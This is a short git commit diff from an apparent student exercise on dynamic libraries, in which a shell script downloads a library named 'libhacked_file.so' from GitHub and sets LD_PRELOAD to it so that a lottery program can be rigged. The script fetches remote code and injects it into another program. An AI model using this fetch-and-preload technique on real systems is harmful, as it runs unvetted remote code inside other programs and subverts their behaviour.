c7ce7b5da5d282632578504720008665f2cc7cc5
Michky23 <michael23.micky@gmail.com>
2024-01-15 13:49:34 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -p .. https://raw.github.com/Michky23/alx-low_level_programming/master/0x18-dynamic_libraries/libhacked_file.so
+wget -p .. https://raw.githubusercontent.com/Michky23/alx-low_level_programming/master/0x18-dynamic_libraries/libhacked_file.so
 export LD_PRELOAD="$PWD/../libhacked_file.so"
